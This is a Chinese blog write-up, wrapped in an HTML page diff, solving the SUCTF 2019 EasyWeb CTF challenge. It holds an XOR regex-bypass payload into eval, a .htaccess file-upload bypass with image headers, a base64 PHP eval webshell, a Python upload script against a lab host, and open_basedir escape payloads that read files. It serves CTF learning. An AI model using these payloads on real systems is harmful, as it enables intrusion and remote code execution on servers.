@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 源码1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF 2019]EasyWeb(php绕正则加文件上传)">
+<meta property="og:url" content="https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/index.html">
+<meta property="og:site_name" content="ta3shi 个人学习自用">
+<meta property="og:description" content="0x00 源码1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-11-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-13T13:29:28.521Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="ctfweb">
+<meta property="article:tag" content="upload">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SUCTF 2019]EasyWeb(php绕正则加文件上传)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2020/11/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2020/11/20/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&text=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&is_video=false&description=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUCTF 2019]EasyWeb(php绕正则加文件上传)&body=Check out this article: https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&name=SUCTF 2019]EasyWeb(php绕正则加文件上传)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&t=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">0x00 源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E2%80%93%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">0x01 绕过正则–异或绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">0x02 上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text">上传限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">.htaccess绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-htaccess%E5%89%8D%E6%B7%BB%E5%8A%A0"><span class="toc-number">3.1.0.1.1.</span> <span class="toc-text">在.htaccess前添加</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-htaccess%E5%89%8D%E6%B7%BB%E5%8A%A0x00x00x8ax39x8ax39-%E8%A6%81%E5%9C%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%AD%E6%B7%BB%E5%8A%A0%EF%BC%8C%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8python%E7%9A%84bytes%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.0.1.2.</span> <span class="toc-text">在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">shell的绕过</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SUCTF 2019]EasyWeb(php绕正则加文件上传)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-25T16:00:00.000Z" class="dt-published" itemprop="datePublished">2020-11-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctf%E7%BB%83%E4%B9%A0/">ctf练习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctfweb/" rel="tag">ctfweb</a>, <a class="p-category" href="/tags/upload/" rel="tag">upload</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x00-源码"><a href="#0x00-源码" class="headerlink" title="0x00 源码"></a>0x00 源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = <span class="title function_ invoke__">count_chars</span>(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x01-绕过正则–异或绕过"><a href="#0x01-绕过正则–异或绕过" class="headerlink" title="0x01 绕过正则–异或绕过"></a>0x01 绕过正则–异或绕过</h1><p>构造get</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>).<span class="string">&quot;^&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>^<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+<p>之后传<code>?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%fe&#125;();&amp;%fe=phpinfo</code><br>成功绕过<br>这里过滤了“~ ”,不然可以用取反绕过<code>$&#123;~(%A0%B8%BA%AB)&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</code></p>
+<h1 id="0x02-上传绕过"><a href="#0x02-上传绕过" class="headerlink" title="0x02 上传绕过"></a>0x02 上传绕过</h1><h2 id="上传限制"><a href="#上传限制" class="headerlink" title="上传限制"></a>上传限制</h2><ul>
+<li>文件内容中不能出现&lt;?</li>
+<li>使用了exif_imagetype来判断是不是图片</li>
+<li>后缀名中不允许出现ph</li>
+<li>环境是apache上传.htaccess(nginx上传.user.ini文件)</li>
+</ul>
+<h4 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h4><p>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法:</p>
+<h5 id="在-htaccess前添加"><a href="#在-htaccess前添加" class="headerlink" title="在.htaccess前添加"></a>在.htaccess前添加</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
+<p>#在.htaccess是注释符，所以.htaccess文件可以生效</p>
+<h5 id="在-htaccess前添加x00x00x8ax39x8ax39-要在十六进制编辑器中添加，或者使用python的bytes类型"><a href="#在-htaccess前添加x00x00x8ax39x8ax39-要在十六进制编辑器中添加，或者使用python的bytes类型" class="headerlink" title="在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)"></a>在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)</h5><p>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess</p>
+<h4 id="shell的绕过"><a href="#shell的绕过" class="headerlink" title="shell的绕过"></a>shell的绕过</h4><p>这里的php是7.2的版本，无法使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>来绕过对&lt;?的检测<br>解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码,比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application/x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc&quot;</span><br></pre></td></tr></table></figure>
+<p>shell.jpg<br><code>GIF89a00PD9waHAgZXZhbCgkX0dFVFsnYSddKTs/Pg==</code>两个00是为了补足8个字符<br>上传脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;a&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.jpg&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>访问phpinfo会发现存在open_basedir和disable_functions的限制<br>open_basedir:<br><code>/var/www/html/:/tmp/</code><br>可以利用一个新的方法绕过open_basedir的限制<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">绕过方法</a><br>payload：<br><code>?a=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;)); </code><br>找到文件后<br><code>?a=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;)); </code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">0x00 源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E2%80%93%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">0x01 绕过正则–异或绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">0x02 上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text">上传限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">.htaccess绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-htaccess%E5%89%8D%E6%B7%BB%E5%8A%A0"><span class="toc-number">3.1.0.1.1.</span> <span class="toc-text">在.htaccess前添加</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-htaccess%E5%89%8D%E6%B7%BB%E5%8A%A0x00x00x8ax39x8ax39-%E8%A6%81%E5%9C%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%AD%E6%B7%BB%E5%8A%A0%EF%BC%8C%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8python%E7%9A%84bytes%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.0.1.2.</span> <span class="toc-text">在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">shell的绕过</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&text=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&is_video=false&description=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUCTF 2019]EasyWeb(php绕正则加文件上传)&body=Check out this article: https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&title=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&name=SUCTF 2019]EasyWeb(php绕正则加文件上传)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2020/11/26/SUCTF2019EasyWeb/&t=SUCTF 2019]EasyWeb(php绕正则加文件上传)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
